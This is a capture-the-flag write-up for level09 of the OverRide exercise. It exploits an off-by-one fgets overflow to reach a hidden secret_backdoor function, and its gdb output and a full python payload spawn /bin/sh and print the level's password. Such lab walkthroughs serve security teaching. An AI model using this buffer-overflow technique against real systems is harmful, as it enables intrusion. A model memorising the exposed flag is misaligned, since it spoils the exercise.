```
    level09@OverRide:~$ ./level09
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: level9
    >: Welcome, level9
    >: Msg @Unix-Dude
    >>: hello
    >: Msg sent!
```
***

    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x00000000000006f0  _init
    0x0000000000000720  strncpy
    0x0000000000000720  strncpy@plt
    0x0000000000000730  puts
    0x0000000000000730  puts@plt
    0x0000000000000740  system
    0x0000000000000740  system@plt
    0x0000000000000750  printf
    0x0000000000000750  printf@plt
    0x0000000000000760  __libc_start_main
    0x0000000000000760  __libc_start_main@plt
    0x0000000000000770  fgets
    0x0000000000000770  fgets@plt
    0x0000000000000780  __cxa_finalize
    0x0000000000000780  __cxa_finalize@plt
    0x0000000000000790  _start
    0x00000000000007bc  call_gmon_start
    0x00000000000007e0  __do_global_dtors_aux
    0x0000000000000860  frame_dummy
    0x000000000000088c  secret_backdoor
    0x00000000000008c0  handle_msg
    0x0000000000000932  set_msg
    0x00000000000009cd  set_username
    0x0000000000000aa8  main
    0x0000000000000ad0  __libc_csu_init
    0x0000000000000b60  __libc_csu_fini
    0x0000000000000b70  __do_global_ctors_aux
    0x0000000000000ba8  _fini
***

    (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    0x0000000000000bb8  _IO_stdin_used
    0x0000000000000e08  __FRAME_END__
    0x0000000000201df4  __init_array_end
    0x0000000000201df4  __init_array_start
    0x0000000000201df8  __CTOR_LIST__
    0x0000000000201e00  __CTOR_END__
    0x0000000000201e08  __DTOR_LIST__
    0x0000000000201e10  __DTOR_END__
    0x0000000000201e18  __JCR_END__
    0x0000000000201e18  __JCR_LIST__
    0x0000000000202038  __data_start
    0x0000000000202038  data_start
    0x0000000000202040  __dso_handle
    0x0000000000202060  completed.6531
    0x0000000000202068  dtor_idx.6533
    0x0000000000202080  save
***

Firstly, the architecture used is x86_64

Secondly, from the list of all functions and from disassemlered code that there is a function named `secret_backdoor` that is not called anywhere. `secret_backdoor` reads stdin with `fgets` and passes what is read to `system` function. So we want to get to this function to call `"/bin/sh"`

Let's see what the program does. It reads username and message with `fgets` and stores them in structure. Username can be 40 char long and message - 140.

Thankfully, the creator made a mistake and instead of 40 bytes `fgets` reads 41. We can use it to overwrite the next variable - size used in strncpy for copying message text into structure. With this we can get to rsp (stack pointer) to change it to `secret_backdoor` address.

Let's find rsp address with [this](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) tool. As a 1 byte size overwrite we will use the biggest possible number - \xff = 255.


***
```
    level09@OverRide:~$ python -c 'print "F" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"' > /tmp/lvl09

    (gdb) r < /tmp/lvl09
    Starting program: /home/users/level09/level09 < /tmp/lvl09
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    0x0000555555554931 in handle_msg ()
    (gdb) info registers
    rax            0xd      13
    rbx            0x0      0
    rcx            0x7ffff7b01f90   140737348902800
    rdx            0x7ffff7dd5a90   140737351867024
    rsi            0x7ffff7ff7000   140737354100736
    rdi            0xffffffff       4294967295
    rbp            0x6741356741346741       0x6741356741346741
    rsp            0x7fffffffe5c8   0x7fffffffe5c8
    r8             0x7ffff7ff7004   140737354100740
    r9             0xc      12
    r10            0x21     33
    r11            0x246    582
    r12            0x555555554790   93824992233360
    r13            0x7fffffffe6b0   140737488348848
    r14            0x0      0
    r15            0x0      0
    rip            0x555555554931   0x555555554931 <handle_msg+113>
    eflags         0x10246  [ PF ZF IF RF ]
    cs             0x33     51
    ss             0x2b     43
    ds             0x0      0
    es             0x0      0
    fs             0x0      0
    gs             0x0      0
    (gdb) x $rbp
    0x6741356741346741:     Cannot access memory at address 0x6741356741346741
```
***

We put rbp (frame pointer) address 0x6741356741346741 into the tool, get 192 and add 8 to reach rsp (the size of the stack frame)

The offset is 200

Dynamic address of `secret_backdoor` can also be found during runtime:
***
```
    (gdb) info function secret_backdoor
    All functions matching regular expression "secret_backdoor":

    Non-debugging symbols:
    0x000055555555488c  secret_backdoor

    # or

    (gdb) x secret_backdoor
    0x55555555488c <secret_backdoor>:       0xe5894855
```
***

Now we can create an exploit:

1. Fill username -> "F" * 40
1. Message size overwrite = offset to rsp + address size = 200 + 8 = 0xd0 -> "\xd0"
2. 200 chars for offset -> "F" * 200
3. `secret_backdoor` address -> "\x8c\x48\x55\x55\x55\x55\x00\x00"
4. Call to shell -> "/bin/sh"

And we shouldn't forget to separate inputs with "/n"

***
```
    level09@OverRide:~$ (python -c 'print "F" * 40 + "\xd0" + "\n" + "F" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' ; cat -) | ./level09
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF�>: Msg @Unix-Dude
    >>: >: Msg sent!
    cat /home/users/end/.pass
    j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
